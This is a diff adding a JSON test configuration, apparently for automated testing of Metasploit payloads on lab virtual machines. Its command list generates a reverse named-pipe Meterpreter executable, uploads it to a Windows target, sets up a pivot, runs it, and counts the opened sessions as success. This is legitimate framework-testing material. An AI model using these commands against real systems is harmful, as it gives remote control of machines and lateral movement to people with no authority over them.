@@ -1,0 +1,65 @@
+{
+	"HTTP_PORT":			5309,
+	"STARTING_LISTENER":		30000,
+	"CREDS_FILE":			"../JSON/creds.json",
+	"MSF_HOSTS":
+	[
+		{
+			"TYPE":			"VIRTUAL",
+			"METHOD":		"VM_TOOLS_UPLOAD",
+			"HYPERVISOR_CONFIG":	"../JSON/esxi_config.json",
+			"TESTING_SNAPSHOT":		"READY",
+			"CPE":			"cpe:/a:rapid7:metasploit:::",
+			"MSF_PATH":		"/home/msfuser/rapid7/metasploit-framework",
+			"MSF_ARTIFACT_PATH":	"/home/msfuser/rapid7/test_artifacts"
+		}
+	],
+		"TARGET_GLOBALS":
+	{
+			"TYPE":			"VIRTUAL",
+			"HYPERVISOR_CONFIG":	"../JSON/esxi_config.json",
+			"METHOD":		"VM_TOOLS_UPLOAD",
+			"PAYLOAD_DIRECTORY":	"C:\\payload_test",
+			"PYTHON":		"C:\\tools\\python\\python.exe",
+			"METERPRETER_PYTHON":	"C:\\tools\\python\\python.exe",
+			"METERPRETER_JAVA":	"java.exe",
+			"TESTING_SNAPSHOT":	"EnableAutoLogin"
+	},
+	"TARGETS":
+	[
+		{
+			"CPE":			"cpe:/o:microsoft:windows_server_2016:::x64"
+		}
+	],
+	"PAYLOADS":
+	[
+		{
+			"NAME": "windows/meterpreter_reverse_tcp",
+			"SETTINGS": []
+		}
+	],
+	"MODULES":
+	[
+		{
+			"NAME":		"exploit/multi/handler",
+			"SETTINGS":	[]
+		}
+	],
+	"COMMAND_LIST": [
+		"use windows/x64/meterpreter/reverse_named_pipe",
+		"set PIPEHOST TARGET_IP",
+		"set PIPENAME mypipe",
+		"generate -o pipe.exe -f exe",
+		"sessions -C 'upload pipe.exe'",
+		"sessions -C 'pivot add -t pipe -l TARGET_IP -n mypipe -a x64 -p windows'",
+		"sessions -C 'execute -f pipe.exe'",
+		"<ruby>",
+		"sleep(60)",
+		"</ruby>"
+	],
+	"SUCCESS_LIST": [
+		"[*] Meterpreter session 1 opened",
+		"[*] Meterpreter session 2 opened"
+	]
+}
+
